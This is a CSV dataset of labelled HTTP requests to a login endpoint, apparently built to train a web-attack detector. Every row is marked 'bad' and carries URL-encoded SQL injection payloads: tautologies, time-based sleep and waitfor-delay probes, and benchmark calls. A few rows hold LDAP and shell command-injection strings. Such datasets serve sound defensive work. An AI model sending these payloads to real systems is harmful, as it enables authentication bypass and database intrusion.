method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
GET,/bank/main.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,bad
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,bad
POST,/doLogin,uid=%22%26%22&passw=dv&btnSubmit=Login,0,2,0,0,0,0,0,0,0,8,32,1,bad
POST,/doLogin,uid=%22%29%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=asf&btnSubmit=Login,2,1,1,0,2,0,1,0,0,8,64,3,bad
POST,/doLogin,uid=%22%29%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=sf&btnSubmit=Login,2,1,1,0,2,0,1,0,0,8,63,3,bad
POST,/doLogin,uid=%22%29%29+or+%28%28%22x%22%29%29%3D%28%28%22x&passw=as&btnSubmit=Login,0,4,0,4,2,0,0,0,0,8,48,1,bad
POST,/doLogin,uid=%22%29%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=af&btnSubmit=Login,0,1,0,2,2,0,0,0,0,8,63,1,bad
POST,/doLogin,uid=%22%29%29+or+pg_sleep%28__TIME__%29--&passw=adc&btnSubmit=Login,0,1,1,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=%22%29%29+or+pg_sleep%28__TIME__%29--&passw=af&btnSubmit=Login,0,1,1,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=%22%29%29+or+pg_sleep%28__TIME__%29--&passw=asc&btnSubmit=Login,0,1,1,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=%22%29%29+or+sleep%28__TIME__%29%3D%22&passw=AEFEF&btnSubmit=Login,0,2,0,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=%22%29%29+or+sleep%28__TIME__%29%3D%22&passw=ad&btnSubmit=Login,0,2,0,1,2,0,0,0,0,8,53,2,bad
POST,/doLogin,uid=%22%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=as&btnSubmit=Login,2,1,1,0,2,0,1,0,0,8,62,3,bad
POST,/doLogin,uid=%22%29+or+%28%22x%22%29%3D%28%22x&passw=asv&btnSubmit=Login,0,4,0,2,2,0,0,0,0,8,45,1,bad
POST,/doLogin,uid=%22%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=ad&btnSubmit=Login,0,1,0,2,2,0,0,0,0,8,62,1,bad
POST,/doLogin,uid=%22%29+or+pg_sleep%28__TIME__%29--&passw=as&btnSubmit=Login,0,1,1,1,2,0,0,0,0,8,55,2,bad
POST,/doLogin,uid=%22%29+or+pg_sleep%28__TIME__%29--&passw=sfsef&btnSubmit=Login,0,1,1,1,2,0,0,0,0,8,58,2,bad
POST,/doLogin,uid=%22%29+or+sleep%28__TIME__%29%3D%22&passw=efweg&btnSubmit=Login,0,2,0,1,2,0,0,0,0,8,55,2,bad
POST,/doLogin,uid=%22%29+or+sleep%28__TIME__%29%3D%22&passw=gn&btnSubmit=Login,0,2,0,1,2,0,0,0,0,8,52,2,bad
POST,/doLogin,uid=%22%29+or+sleep%28__TIME__%29%3D%22&passw=sgre&btnSubmit=Login,0,2,0,1,2,0,0,0,0,8,54,2,bad
POST,/doLogin,uid=%22%29+or+true--+%27%29+or+true--&passw=ac&btnSubmit=Login,1,1,2,0,5,0,0,0,0,8,54,1,bad
POST,/doLogin,uid=%22%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=SAFASD&btnSubmit=Login,2,1,1,0,2,0,1,0,0,8,65,3,bad
POST,/doLogin,uid=%22%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--&passw=aef&btnSubmit=Login,2,1,1,0,2,0,1,0,0,8,62,3,bad
POST,/doLogin,uid=%22*%22&passw=adv&btnSubmit=Login,0,2,0,0,0,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=%22+%22&passw=adv&btnSubmit=Login,0,2,0,0,1,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=%22+or+%22%22%26%22&passw=%22+or+%22%22%26%22&btnSubmit=Login,0,8,0,0,4,0,0,0,0,8,45,1,bad
POST,/doLogin,uid=%22+or+%22%22%5E%22&passw=ac&btnSubmit=Login,0,4,0,0,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=%22+or+%22%22*%22&passw=asc&btnSubmit=Login,0,4,0,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%22+or+%22%22-%22&passw=dv&btnSubmit=Login,0,4,0,0,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=%22+or+%22a%22%3D%22a&passw=as&btnSubmit=Login,0,4,0,0,2,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=%22+or+%22a%22%3D%22a&passw=sd&btnSubmit=Login,0,4,0,0,2,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=%22+or+%22x%22%3D%22x&passw=asc&btnSubmit=Login,0,4,0,0,2,0,0,0,0,8,41,1,bad
POST,/doLogin,uid=%22+or+1%3D1--&passw=as&btnSubmit=Login,0,1,1,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=%22+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=asf&btnSubmit=Login,0,1,0,2,2,0,0,0,0,8,62,1,bad
POST,/doLogin,uid=%22+or+isNULL%281%2F0%29+%2F*&passw=ef&btnSubmit=Login,0,1,0,1,3,0,0,0,0,8,48,1,bad
POST,/doLogin,uid=%22+or+pg_sleep%28__TIME__%29--&passw=efa&btnSubmit=Login,0,1,1,1,2,0,0,0,0,8,55,2,bad
POST,/doLogin,uid=%22+or+pg_sleep%28__TIME__%29--&passw=sfasf&btnSubmit=Login,0,1,1,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=%22+or+sleep%28__TIME__%29%23&passw=af&btnSubmit=Login,0,1,0,1,2,0,0,0,0,8,50,2,bad
POST,/doLogin,uid=%22+or+sleep%28__TIME__%29%23&passw=kjksefg&btnSubmit=Login,0,1,0,1,2,0,0,0,0,8,55,2,bad
POST,/doLogin,uid=%22+or+sleep%28__TIME__%29%3D%22&passw=efweg&btnSubmit=Login,0,2,0,1,2,0,0,0,0,8,54,2,bad
POST,/doLogin,uid=%22+or+true--&passw=dav&btnSubmit=Login,0,1,1,0,2,0,0,0,0,8,41,1,bad
POST,/doLogin,uid=%22-%22&passw=adv&btnSubmit=Login,0,2,0,0,0,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=%22a%22%22+or+1%3D1--%22&passw=a&btnSubmit=Login,0,4,1,0,2,0,0,0,0,8,42,1,bad
POST,/doLogin,uid=%22a%22%22+or+3%3D3--%22&passw=asf&btnSubmit=Login,0,4,1,0,2,0,0,0,0,8,44,1,bad
POST,/doLogin,uid=%22hi%22%22%29+or+%28%22%22a%22%22%3D%22%22a%22&passw=asd&btnSubmit=Login,0,10,0,1,2,0,0,0,0,8,51,1,bad
POST,/doLogin,uid=%2520%24%28sleep%252050%29&passw=af&btnSubmit=Login,0,0,0,1,0,0,0,0,0,8,45,2,bad
POST,/doLogin,uid=%2520%27sleep%252050%27&passw=aef&btnSubmit=Login,2,0,0,0,0,0,0,0,0,8,45,2,bad
POST,/doLogin,uid=%2520or%2520%27%27%3D%27&passw=a&btnSubmit=Login,3,0,0,0,0,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=%2520or%2520%27x%27%3D%27x&passw=ad&btnSubmit=Login,3,0,0,0,0,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=%2520or%25201%3D1&passw=sf&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=%2520or%2520x%3Dx&passw=ad&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=%2527%2520or%25201%3D1&passw=as&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=%252A%2528%257C%2528objectclass%253D%252A%2529%2529&passw=af&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,64,1,bad
POST,/doLogin,uid=%27%26%27&passw=c&btnSubmit=Login,2,0,0,0,0,0,0,0,0,8,31,1,bad
POST,/doLogin,uid=%27%29%29+or+%28%28%27x%27%29%29%3D%28%28%27x&passw=adv&btnSubmit=Login,4,0,0,4,2,0,0,0,0,8,49,1,bad
